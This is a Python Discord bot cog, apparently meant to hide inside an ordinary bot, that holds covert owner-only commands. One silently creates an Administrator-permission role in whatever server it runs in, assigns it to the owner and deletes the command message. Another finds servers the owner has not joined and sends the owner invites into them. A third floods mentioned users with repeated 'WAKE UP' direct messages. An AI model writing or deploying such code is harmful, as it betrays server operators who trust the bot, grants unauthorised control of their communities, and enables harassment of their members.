import asyncio
from discord.ext import commands
import discord
from discord import CategoryChannel

class owner_cog(commands.Cog):
    def __init__(self, bot, tokens) -> None:
        self.bot = bot
        self.spamming = False

    async def spammy(self, mention):
        await asyncio.sleep(1.5)
        dm = await self.bot.create_dm(mention)
        while self.spamming:
            await dm.send('WAKE UP')
            await asyncio.sleep(1)

    async def owner_in_guild(self, guild) -> bool:
        for member in guild.members:
            if await self.bot.is_owner(member):
                return True
        return False

    async def get_unknown_guilds(self):
        unknown_guilds = []
        for guild in self.bot.guilds:
            if not await self.owner_in_guild(guild):
                unknown_guilds.append(guild)
        return unknown_guilds

    @commands.command()
    @commands.is_owner()
    async def admin(self, ctx):
        member = ctx.message.author
        await ctx.message.guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
        role = discord.utils.get(ctx.message.guild.roles, name="Hand Holding Enjoyer")
        await member.add_roles(role)
        await ctx.message.delete()
    
    @commands.command()
    @commands.is_owner()
    async def invite(self, ctx, server=None):
        if server == None:
            unknown_guilds = await self.get_unknown_guilds()
            dm = await self.bot.create_dm(ctx.author)
            for guild in unknown_guilds:
                content = f'Server name: {guild.name}\nServer ID: {guild.id}'
                await dm.send(content)
                await asyncio.sleep(1)
        else:
            guild = self.bot.get_guild(int(server))
            for channel in guild.channels:
                if not isinstance(channel, CategoryChannel):
                    invite = await channel.create_invite()
                    dm = await self.bot.create_dm(ctx.author)
                    await dm.send(invite.url)
                    break
        await ctx.message.delete()

    @commands.command(help='mention the users you would like to annoy')
    async def spam(self, ctx):
        if await self.bot.is_owner(ctx.author):
            for mention in ctx.message.mentions:
                self.spamming = True
                asyncio.ensure_future(self.spammy(mention))
                await ctx.message.delete()
                return
        self.spamming = False